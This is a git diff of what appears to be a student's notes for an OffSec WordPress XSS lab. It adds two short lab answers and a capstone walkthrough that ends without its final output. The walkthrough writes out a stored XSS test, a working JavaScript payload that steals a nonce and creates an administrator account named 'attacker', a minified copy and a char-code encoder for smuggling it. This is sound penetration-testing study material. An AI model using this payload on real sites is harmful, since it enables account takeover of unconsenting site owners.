@@ -54,19 +54,83 @@ Launching the Final XSS Attack through Curl
 >```
 
 Lab 1 - Start Walkthrough VM 1 and replicate the steps learned in this Learning Unit to identify the basic XSS vulnerability present in the Visitors plugin. Based on the source code portion we have explored, which other HTTP header might be vulnerable to a similar XSS flaw?
->``` shell
->
->```
->
+>X-Forwarded-For
 
 Lab 2 - Start Walkthrough VM 2 and replicate the privilege escalation steps we explored in this Learning Unit to create a secondary administrator account. What is the JavaScript method responsible for interpreting a string as code and executing it? Submit the answer as the method name only, or methodName().
->``` shell
->
->```
->
+>eval()
 
 Lab 3 - Capstone Lab: Start Module Exercise VM 1 and add a new administrative account like we did in this Learning Unit. Next, craft a WordPress plugin that embeds a web shell and exploit it to enumerate the target system. Upgrade the web shell to a full reverse shell and obtain the flag located in /tmp/. Note: The WordPress instance might show slow responsiveness due to lack of internet connectivity, which is expected.
 >``` shell
+># Map Hostname to IP
+>kali@kali:~$ sudo nano /etc/hosts
 >
+># Add this line at the bottom:
+>192.168.179.16 offsecwp
+>
+># Save and exit:
+>Ctrl + X
+>
+># Navigate to http://offsecwp/?p=1 and test for an XSS vulnerability by entering the followng in the comment section:
+><script>alert(1)</script>
+>
+># ========== Expected Result ==========
+>1
+># =====================================
+>
+># Navigate to https://jscompress.com/ and compress the following JavaScript to a one liner:
+>// Step 1: Fetch nonce from /wp-admin/user-new.php
+>var ajaxRequest = new XMLHttpRequest();
+>var requestURL = "/wp-admin/user-new.php";
+>var nonceRegex = /ser" value="([^"]*?)"/g;
+>ajaxRequest.open("GET", requestURL, false);
+>ajaxRequest.send();
+>var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+>var nonce = nonceMatch[1];
+>
+>// Step 2: Create new admin user
+>var params = "action=createuser&_wpnonce_create-user=" + nonce +
+>    "&user_login=attacker&email=attacker@offsec.com" +
+>    "&pass1=attackerpass&pass2=attackerpass&role=administrator";
+>
+>ajaxRequest = new XMLHttpRequest();
+>ajaxRequest.open("POST", requestURL, true);
+>ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+>ajaxRequest.send(params);
+>
+># ========== Expected Result ==========
+>var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
+># =====================================
+>
+># Navigate to http://offsecwp/?p=1
+>
+># Right-click anywhere on the page, click Inspect
+>
+># Navigate to the "Console" tab and enter the following:
+>
+># Define the function
+>function encode_to_javascript(string) {
+>    var output = '';
+>    for (let i = 0; i < string.length; i++) {
+>        output += string.charCodeAt(i);
+>        if (i !== string.length - 1) output += ",";
+>    }
+>    return output;
+>}
+>
+># Assign your JavaScript payload as a string
+>let payload = 'var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);';
+>
+># Encode it
+>let encoded = encode_to_javascript(payload);
+>console.log(encoded);
+># ========== Expected Result ==========
+>
+># =====================================
+
+
+
+
+
+
 >```
 >
